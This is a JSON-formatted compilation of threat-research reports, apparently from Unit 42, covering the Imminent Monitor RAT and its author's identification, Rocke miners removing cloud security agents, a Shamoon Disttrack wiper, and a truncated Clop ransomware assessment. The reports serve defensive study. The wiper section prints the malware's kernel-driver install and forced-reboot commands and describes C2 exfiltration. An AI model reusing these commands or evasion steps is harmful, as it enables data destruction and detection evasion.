                "\u201cThe keylogger: The logs are hidden, and encrypted, fast transfer of the logs aswell, with progress indicating how much of the log is downloaded\u201d\u2026\n\u201cThe crypter:",
                "The crypter is really just a bonus feature, not always FUD but I try and do my best to keep it FUD.\u201d",
                "[Sic]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Legitimate remote access tools dont need to hide and encrypt their logs.",
                "A crypter, allowing a Fully UnDetectable (FUD) client, only has one purpose: to attempt to evade antivirus detection."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Later versions include protection to help avoid detection/removal, also not a feature expected of a legitimate, permissible remote access client (Figure 3)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3. \"Protection\" features"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The most recent sales page for Imminent Monitor continued to profess legitimacy (Figure 4)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4. Imminent Monitor \"About\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, features remain that lend utility rather to illegitimate use, hiding the client and maintaining persistence (Figure 5)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5.",
                "\"Protection\" features"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Shockwave promotes the RATsprotection features:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "\u201cFile Integration\nThe File Integration feature will delete the Imminent Monitor Client from it\u2019s execution directory and move it into it\u2019s \u201cClient Startup\u201d directory."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Set File Properties to \u201cHidden\u201d\nDoes what it says, marks the Client as hidden."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Disable Taskmanager\nDisables Windows Task Manager/"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Process Security Flag & Critical Process Flag\nBoth of these functions are currently deprecated as the \u201cProcess Watcher\u201d feature replaces them/"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Process Watcher\nThe Process Watcher feature spawns a separate daemon to watch the main Imminent Monitor Client in case the client ever crashes or gets closed.\u201d"
            ]
        },
        {
            "type": "caption",
            "content": [
                "More recent versions offer what the author terms \u201cHRDP\u201d \u2013 Hidden Remote Desktop Protocol \u2013 offering a non-interactive remote desktop connection, hidden from the victim."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6. Features"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Version 3 of Imminent Monitor introduced the ability to run a cryptocurrency miner on the victim machine  hardly the feature of a legitimate remote access tool (Figure 7)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7. Imminent Monitor Client Cryptocurrency Miner"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "But, in the end, it will be the courts who will determine legitimacy and intent of the malware author, and also their customers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Imminent Monitor was originally licensed to each customer for a $25 fee.",
                "Six years later, the price has remained static, though new multi-license options are also offered (Figure 8)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 8.",
                "Purchase"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In order to identify actors behind such operations as Imminent Monitor, its important to be thorough with analysis and intelligence collection.",
                "The actor will typically attempt to hide or obfuscate their identity.",
                "The research will not only aim to directly identify a specific individual but also help to build a corroborative identity picture, increasing confidence in any analysis."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Infrastructure research did not lead us to any identifying information, though we do notice a definite preference for Australian hosting early on."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Forum profiles for Shockwave and Imminentmethods included a common profile photo, a panda-headed business-suited avatar (Figure 9)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9.",
                "Shockwave/ ImminentMethods' avatar"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Twitter account imminentmethods includes a location of Queensland, Australia.",
                "A Google+ account for imminentmethods[at]gmail.com had the same Panda avatar, and the name (redacted here for publication) J."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A deviantart.com profile for user ViridianX had the same panda avatar, a link to imminentmethods[.]info, location Australia, and the same name J again.",
                "This handle was corroborated in a forum post:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "\u201cAlso, I have noticed I have been getting imitated on various websites lately my only Accounts are:\nshockwave.hf\nhttp://www.twitch.tv/imminentmethods [twitch]\nViridianX [Justin.tv]\u201d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A Paypal purchase from imminentmethods[.]net gave a merchant name DictumFox(Figure 10)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 10.",
                "Paypal"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This appears to be a unique handle.",
                "The site, dictumfox[.]com, previously had the site title Imminent Methods(Figure 11)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 11. DictumFox",
                "-Imminent Methods"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The imminentmethods[.]net Contact us page has an Australian phone number and time zone, and a New South Wales, Australia address which comes back to a small-business services address."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A search of the Australian business registry finds a DictumFox, with a registered agent at the same address of convenience, with a different, female first name J K. She was also previously linked to another Australian business, Imminent Methods.",
                "That business record has a current agent with the same first name as seen in the profiles - J - and the same surname as the female associated with the other business registration: K."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Further research with name and location corroboration seems to possibly explain the relationship with Shockwave-J, and the J of the corporate registration, beyond the same surname K (Figure 12)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 12.",
                "J and J"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 referred the identity and activity of Shockwave to the Australian Federal Police (AFP) Cybercrime Operations teams.",
                "We have subsequently continued to assist the AFPs Operation Cepheus (Figure 13), together with the United States Federal Bureau of Investigation (FBI), and Canadian Radio-television and Telecommunications Commission, Electronic Commerce Enforcement / Conseil de la radiodiffusion et des tlcommunications canadiennes, Mise en application du commerce lectronique (CRTC ECE).",
                "The Australian-led investigation, targeting not only those responsible for the development and management of this malware, but also their customers using the malware illicitly, has yielded evidence suggesting in excess of 14,500 customers of this RAT.",
                "We most often observe RATs employed illicitly by financially-motivated actors, or for data theft.",
                "Interestingly, the AFPs investigation noted a significant number of Australian users of the software were also respondents to Domestic Violence Orders.",
                "Its unlikely a coincidence that such a tool might be employed against Intimate Partner Violence victims.",
                "AFPs operation also disabled the licensing system of Imminent Monitor, removing users access to victims of the software.",
                "Unit 42s research into the infrastructure and customers of Imminent Monitor and other RATs continues to assist law enforcement internationally in prosecuting the individuals behind such illicit activity, demonstrating the effectiveness and potential of international public/private cooperation in combating cybercrime."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 12.",
                "AFP execute an Operation Cepheus search warrant (source: AFP)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Weve collected more than 65,000 samples of Imminent Monitor, and seen more than 115,000 attacks against Palo Alto Networks customers alone.",
                "Not only did the availability of this commodity malware enable each of those attacks, the author profited from the sale of it, since 2013."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This Remote Access Tool, promoted first-party on hacking forums, includes features that have no purpose in a legitimate tool but rather are designed to hide attacks using it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With the successful execution of the AFPs operation, licensed Imminent Monitor builders will no longer be able to produce new client malware nor can the controllers access their victims.",
                "Although cracked versions already exist and will continue to circulate, they cant benefit from bug fixes, feature enhancements, support, or efforts to improve their undetectability.",
                "Ironically, these versions often carry malicious payloads, acting as infection vectors to the criminals who would use them, themselves."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Organizations with decent spam filtering, proper system administration, and up-to-date Windows hosts have a much lower risk of infection.",
                "Palo Alto Networks customers are further protected from this threat.",
                "Our threat prevention platform detects Imminent Monitor malware with Wildfire and Traps.",
                "AutoFocus users can track this activity using the ImminentMonitor tag."
            ]
        }
    ],
    "f1ef1c8540322a29014d59bd6461e94b69c61422": [
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks Unit 42 recently captured and investigated new samples of the Linux coin mining malware used by the Rocke group.",
                "The family was suspected to be developed by the Iron cybercrime group and its also associated with the Xbash malware we reported on in September of 2018.",
                "The threat actor Rocke was originally revealed by Talos in August of 2018 and many remarkable behaviors were disclosed in their blog post.",
                "The samples described in this report were collected in October of 2018, and since that time the command and control servers they use have been shut down."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During our analysis, we realized that these samples used by the Rocke group adopted new code to uninstall five different cloud security protection and monitoring products from compromised Linux servers.",
                "In our analysis, these attacks did not compromise these security products: rather, the attacks first gained full administrative control over the hosts and then abused that full administrative control to uninstall these products in the same way a legitimate administrator would."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These products were developed by Tencent Cloud and Alibaba Cloud (Aliyun), the two leading cloud providers in China that are expanding their business globally.",
                "To the best of our knowledge, this is the first malware family that developed the unique capability to target and remove cloud security products.",
                "This also highlights a new challenge for products in the Cloud Workload Protection Platforms market defined by Gartner."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The threat actor Rocke was first reported by Cisco Talos in late July 2018.",
                "The ultimate goal of this threat is to mine Monero cryptocurrency in compromised Linux machines."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To deliver the malware to the victim machines, the Rocke group exploits vulnerabilities in Apache Struts 2, Oracle WebLogic, and Adobe ColdFusion.",
                "For example, by exploiting Oracle WebLogic vulnerability CVE-2017-10271 in Linux shown in Figure 1, a compromised Linux victim machine downloads backdoor 0720.bin and opens a shell."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1. Exploit CVE-2017-10271"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the C2 connection is established, malware used by the Rocke group downloads shell script named as a7 to the victim machine.",
                "The behaviors of a7 include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "According to Gartner, Cloud Workload Protection Platforms (CWPPs) are the agent-based workload-centric security protection solutions.",
                "To mitigate the impact of malware intrusion in public cloud infrastructure, cloud service providers develop their own CWPPs as the server security operation and management products."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For example, Tencent Cloud offers Tencent Host Security (HS, aka YunJing) with various security protection services.",
                "According to its Product Overview document, Tencent Host Security provides key security features like trojan detection and removal based on machine learning, password cracking alert, logging activity audit, vulnerability management, and asset management as shown in Figure 2."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2. Tencent Host Security Key Features"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Alibaba Cloud (Aliyun) also offers a cloud security product called Threat Detection Service (TDS, aka Aegis ).",
                "Alibaba Cloud Threat Detection Service provides security services like malware scanning and removal, vulnerability management, log analysis, and threat analysis based on big data."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Third-party cybersecurity companies also provide CWPPs.",
                "For instance, Trend Micro, Symantec, and Microsoft have their own cloud security products for public cloud infrastructure.",
                "As with all security products, adversaries inevitably work to evade these systems to be able to achieve their ultimate goals."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In response to agent-based Cloud Workload Protection Platforms from cloud service providers, malware used by the Rocke group gradually developed the capability to evade detection before exhibiting any malicious behaviors.",
                "To be more specific, the malware uninstalls cloud security products by Alibaba Cloud and Tencent Cloud."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the early version of the malware used by Rocke, it only attempts to kill Tencent Cloud Monitor process as shown in Figure 3."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3. Malware kills Tencent Cloud Monitor process"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Realizing that killing the cloud monitor service alone is not enough to evade detection by agent-based cloud security products, the malware authors continued developing more effective methods to evade detection by killing more agent-based cloud security services."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Tencent Cloud and Alibaba Cloud official websites provide documents to guide users about how to uninstall their cloud security products.",
                "The document for uninstalling Alibaba Threat Detection Service is shown in Figure 4."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4. Official guide for uninstalling Alibaba Threat Detection Service"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The document for uninstalling Tencent Cloud Host Security is shown in Figure 5."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5.",
                "Official guide for uninstalling Tencent Cloud Host Security Product"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware used by the Rocke group follows the uninstallation procedure provided by Alibaba Cloud and Tencent Cloud as well as some random blog posts on the Internet.",
                "The key uninstall function is shown in Figure 6."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6.",
                "Key function for malware to evade detection"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This function can uninstall:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After agent-based cloud security and monitor products are uninstalled, the malware used by the Rocke group begins to exhibit malicious behaviors.",
                "We believe this unique evasion behavior will be the new trend for malware which targets public cloud infrastructure."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks Unit 42 has been cooperating with Tencent Cloud and Alibaba Cloud to address the malware evasion problem and its C2 infrastructure.",
                "Additionally, the malicious C2 domains are identified by our PAN-DB URL Filtering."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Public cloud infrastructure is one of the main targets for this cybercrime group.",
                "Realizing the existing cloud monitor and security products may detect the possible malware intrusion, malware authors continue to create new evasion technologies to avoid being detected by cloud security product."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The variant of the malware used by the Rocke group is an example that demonstrates that the agent-based cloud security solution may not be enough to prevent evasive malware targeted at public cloud infrastructure."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2e3e8f980fde5757248e1c72ab8857eb2aea9ef4a37517261a1b013e3dc9e3c4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2f603054dda69c2ac1e49c916ea4a4b1ae6961ec3c01d65f16929d445a564355"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "28ea5d2e44538cd7fec11a28cce7c86fe208b2e8f53d57bf8a18957adb90c5ab"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "232c771f38da79d5b8f7c6c57ddb4f7a8d6d44f8bca41be4407ed4923096c700"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "893bdc6b7d2d7134b1ceb5445dbb97ad9c731a427490d59f6858a835525d8417"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9300f1aa56a73887d05672bfb9862bd786230142c949732c208e5e019d14f83a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "27611b92d31289d023d962d3eb7c6abd194dbdbbe4e6977c42d94883553841e8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d341e3a9133e534ca35d5ccc54b8a79f93ff0c917790e7d5f73fedaa480a6b93"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ed038e9ea922af9f0bf5e8be42b394650fa808982d5d555e6c50c715ff2cca0c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4b74c4d66387c70658238ac5ab392e2fe5557f98fe09eadda9259ada0d87c0f1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e391963f496ba056e9a9f750cbd28ca7a08ac4cfc434bee4fc57a292b11941e6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "017dee32e287f37a82cf6e249f8a85b5c9d4f090e5452118ccacaf147e88dc66"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "dwn[.]rundll32[.]ml"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "www[.]aybc[.]so"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a[.]ssvs[.]space"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sydwzl[.]cn"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "118.24.150[.]172 (on Tencent Cloud)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "120.55.54[.]65 (on Alibaba Cloud)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/CnPtQ2tM"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/rjPGgXQE"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/1NtRkBc3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/tRxfvbYN"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/SSCy7mY7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/VVt27LeH"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/Fj2YdETv"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/JNPewK6r"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/TzBeq3AM"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/eRkrSQfE"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/5bjpjvLP"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://pastebin[.]com/raw/Gw7mywhC"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "42im1KxfTw2Sxa716eKkQAcJpS6cwqkGaHHGnnUAcdDhG2NJhqEF1nNRwjkBsYDJQtDkLCTPehfDC4zjMy5hefT81Xk2h7V.v7"
            ]
        }
    ],
    "f983112324b47196cb243371511b3c35c5b2ead0": [
        {
            "type": "paragraph",
            "content": [
                "Summary"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On December 10, a new variant of the Disttrack malware was submitted to VirusTotal (SHA256:c3ab58b3154e5f5101ba74fccfd27a9ab445e41262cdf47e8cc3be7416a5904f) that shares a considerable amount of code with the Disttrack malware used in the Shamoon 2 attacks in 2016 and 2017 that we previously published here, here, and here.",
                "While we could not identify the impacted organization from the malware, today Saipem disclosed they were attacked.",
                "In previous attacks, we were able to determine the impacted organization based on the domain names and credentials used by the Disttrack tool to spread to other systems on the network.",
                "However, that functionality was missing from this sample.",
                "Unlike past Shamoon attacks, this particular Disttrack wiper would not overwrite files with an image.",
                "Instead it would overwrite the MBR, partitions, and files on the system with randomly generated data."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "According to a press release, Saipem confirmed that they experienced a cyberattack that involved a variant of the Shamoon malware.",
                "The attack caused infrastructure and data availability issues, forcing the organization to carry out restoration activities.",
                "Saipem told Reuters that 300 systems on their network were crippled by the malware related to the 2012 Shamoon attacks.",
                "While we cannot definitively confirm that Saipem was the impacted organization, the timing of this incident with the emergence of the Disttrack sample discussed in this blog is quite coincidental."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Dropper"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sample submitted to VirusTotal is a Disttrack dropper, which is responsible for installing a communications and wiper module to the system.",
                "The dropper is also responsible for spreading to other systems on the same local network, which it accomplishes by attempting to log into other systems on the network remotely using previously stolen usernames and passwords.",
                "Unfortunately, this particular sample does not contain any domains, usernames, or passwords to perform this spreading functionality, so this sample would only run on the system in which it was specifically executed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper has a hardcoded kill time of '12/7/17 23:51'; if the system date is after this date the dropper installs the wiper module and starts wiping files on the system.",
                "The dropper reads the '%WINDOWS%\\inf\\mdmnis5tQ1.pnf' file to obtain a custom kill date that it will use instead of the hardcoded time.",
                "The communications module installed by the dropper writes to this file, which will be discussed in a later section.",
                "The dropper also decrypts a string '\\inf\\averbh_noav.pnf' that is the other file that the communications module uses to write system information to and if the wiper was able to successfully wipe the system, but the dropper does not appear to use this file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper has three resources, two of which contain embedded modules, specifically a communications module and a wiper module.",
                "The third resource contains an x64 variant of the dropper, which it will use if the architecture of the system is determined to be x64.",
                "The resources have a language set to SUBLANG_ARABIC_YEMEN that was also found in the previous Disttrack samples used in Shamoon 2 attacks.",
                "The resource names are PIC, LNG, and MNU, which are slightly altered versions of the ICO, LANG, and MENU names found in previous samples."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper extracts modules from these resources by seeking a specific offset and reading a specific number of bytes as the length of the ciphertext.",
                "The dropper then decrypts the ciphertext by using an XOR cipher and a specific base64 encode string that is decoded and used as the key.",
                "Before accessing the ciphertext, the dropper subtracts 14 from the specified offset, which is the same as previous Disttrack samples delivered in Shamoon 2 attacks.",
                "Tables 1, 2, and 3 include the resources, the information used to extract them, and the resulting module."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Resource containing the x64 variant of the Disttrack dropper"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 Resource containing the communications module in the Disttrack dropper"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 3 Resource containing the wiper module within the Disttrack dropper"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper will install itself to the system (and remote systems if spreading was possible) by creating a service with the attributes listed in Table 4 below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 4 Service created by the Disttrack dropper"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropper chooses a random name when installing the communication and wiper modules to the system.",
                "The communications module will have one of the following filenames with the exe file extension:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The wiper module will have one of the following filenames with the exe file extension:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Wiper"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The wiper module (SHA256: 391e7b90bf3f0bfeb2c2602cc65aa6be4dd1c01374b89c4a48425f2d22fe231c) that the dropper writes to the system is responsible for overwriting the data within the MBR, partitions, and files on the system.",
                "The wiper carries out this wiping using a legitimate hard disk driver called RawDisk by ElDos.",
                "The wiper contains the ElDos RawDisk driver in a resource named 'e' that it extracts by skipping to offset 1984 and reading 27792 bytes from that offset.",
                "It then decrypts the data using aa 247-byte key and saves it to %WINDOWS%\\system32\\hdv_725x.sys.",
                "The wiper then creates a service named hdv_725x for this driver using the following command line command and runs it with \"sc start hdv_725x\":"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sc create hdv_725x type= kernel start= demand binpath= %WINDOWS%\\system32\\hdv_725x.sys"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This wiper was configured using the R flag, which generates a buffer of random bytes that it will use to overwrite the MBR, partitions and files.",
                "The sample supports two additional configuration flags as well, specifically F and E flags that will either overwrite files using a file or encrypt its contents."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The wiper could be configured to use a file to overwrite the files on the disk using the F configuration flag, as we saw images used to overwrite files in previous Shamoon attacks.",
                "This file would be stored in a resource named GRANT, but this particular wiper is not configured to use a file for overwriting so the GRANT resource does not exist.",
                "If it were configured to use a file, this sample would extract the file using the information listed in Table 5."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 5 Resource in wiper module that would contain file to use for overwriting data"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This sample is also capable of being configured to import an RSA key to encrypt the MBR, partitions, and files via configuration flag E. This sample was not configured to encrypt files, and the RSA key is empty in the wiper."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After completing this wiping functionality, the sample will reboot the system using the following command line, which will render it unusable when the system reboots as the important system locations and files have been overwritten with random data:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "shutdown -r -f",
                "-t 2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Communications"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The communications module (SHA256: 0694bdf9f08e4f4a09d13b7b5a68c0148ceb3fcc79442f4db2aa19dd23681afe) dropped by the Disttrack dropper will use the following two supporting files:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%WINDOWS%\\inf\\mdmnis5tQ1.pnf - Used to set a wipe date for associated wiper module"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%WINDOWS%\\inf\\averbh_noav.pnf - Used to mark successful wiping"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The communications module is responsible for reaching out to hardcoded URLs to communicate with the C2 server, but like previous Disttrack samples, this communication module does not contain functional C2 domains to use in the URLs.",
                "If it did, it would create a URL with a parameter named 'selection' followed by system information and the contents of the 'averbh_noav.pnf' file, as seen here:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "C2 URL, empty]?selection=[system info and contents of averbh_noav.pnf]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When communicating with the C2 URL, the communications module would use a User Agent of 'Mozilla/13.0 (MSIE 7.0; Windows NT 6.0)', which is the same as past Disttrack communication module samples.",
                "Table 6 below show the two commands the C2 could respond with that the communications module could handle."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 6 Commands available within the communication module's command handler"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Disttrack sample uploaded to VirusTotal is a variant of the samples used in the Shamoon 2 attacks in 2016 and 2017.",
                "The tool does not have the capability to spread to other systems on the local network.",
                "Instead it would have to be loaded onto and executed on the system that the actors intend to wipe.",
                "The wipe date of '12/7/2017' does not seem timely.",
                "However, this older date is still effective as the Disttrack dropper will install and run the wiper module as long as the system date is after the wipe date.",
                "Unlike past Shamoon attacks, this particular Disttrack wiper would not overwrite files with an image.",
                "Instead, it would overwrite the MBR, partitions and files on the system with random data.",
                "While we cant confirm this sample was used in the Saipem attack, it is likely at least related to it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c3ab58b3154e5f5101ba74fccfd27a9ab445e41262cdf47e8cc3be7416a5904f - Disttrack Dropper x86"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0975eb436fb4adb9077c8e99ea6d34746807bc83a228b17d321d14dfbbe80b03",
                "- Disttrack Dropper x64"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0694bdf9f08e4f4a09d13b7b5a68c0148ceb3fcc79442f4db2aa19dd23681afe - Disttrack Comms module x86"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "391e7b90bf3f0bfeb2c2602cc65aa6be4dd1c01374b89c4a48425f2d22fe231c",
                "- Disttrack Wiper module x86"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6985ef5809d0789eeff623cd2436534b818fd2843f09fa2de2b4a6e2c0e1a879 - ElDos RawDisk Driver x86"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ccb1209122085bed5bded3f923835a65d3cc1071f7e4ad52bc5cf42057dd2150 - Disttrack Comms module x64"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "dab3308ab60d0d8acb3611bf364e81b63cfb6b4c1783864ebc515297e2297589",
                "- Disttrack Wiper module x64"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bc4513e1ea20e11d00cfc6ce899836e4f18e4b5f5beee52e0ea9942adb78fc70 - ElDos RawDisk Driver x64"
            ]
        }
    ],
    "2b687932021266f45bf2620cd49341b21b1703af": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42 researchers have observed an uptick in Clop ransomware activity affecting the wholesale and retail, transportation and logistics, education, manufacturing, engineering, automotive, energy, financial, aerospace, telecommunications, professional and legal services, healthcare and high tech industries in the U.S., Europe, Canada, Asia Pacific and Latin America.",
                "Clop also leverages double extortion practices and hosts a leak site, where the number of victims has grown significantly since its launch in March 2020.",
                "Clop has been commonly observed being delivered as the final-stage payload of a malicious spam campaign carried out by the financially motivated actor TA505.",
                "This ransomware has also been linked to threat actors behind the recent global zero-day attacks on users of the Accellion File Transfer Appliance (FTA) product."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Due to the surge of this malicious activity, weve created this threat assessment for overall threat awareness.",
                "Full visualization of the techniques observed and their relevant courses of action can be viewed in the Unit 42 ATOM Viewer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Clop ransomware is a variant of a previously known strain called CryptoMix.",
                "In 2019, Clop was delivered as the final payload of a phishing campaign associated with the financially motivated actor TA505.",
                "The threat actors would send phishing emails that would lead to a macro-enabled document that would drop a loader named Get2.",
                "This loader can download different tools used by this group, such as SDBot, FlawedAmmy or FlawedGrace.",
                "After the threat actors obtain the initial foothold on the system, they start employing reconnaissance, lateral movement and exfiltration techniques to prepare the ransomware deployment.",
                "SDBot has been observed delivering Clop as the final payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the ransomware is executed, Clop appends the .clop extension to the victim's files.",
                "We have observed different variants using different extensions, such as .CIIp, .Cllp and .C_L_O_P.",
                "Different versions of the ransom note have also been observed after encryption.",
                "Depending on the variant, any of these ransom text files could drop: ClopReadMe.txt, README_README.txt, Cl0pReadMe.txt and READ_ME_!!!.TXT."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This ransomware includes various features to avoid detection.",
                "Observed Clop samples try to kill several processes and services related to backups and security solutions.",
                "It wont execute if it detects its running in a virtual environment.",
                "Clop also leverages Code Signing to evade detection.",
                "We observed the use of two signers during our research, as shown below in Figure 1."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Clop went from being ransomware delivered through malicious spam to being used in targeted campaigns against high-profile companies.",
                "In recent events, Clop has been linked to threat actors who have been exploiting Accellion File Transfer Appliance (FTA) vulnerabilities: CVE-2021-27101, CVE-2021-27102, CVE-2021-27103 and CVE-2021-27104.",
                "The exploitation of these vulnerabilities led to the compromise of high-profile companies starting in February.",
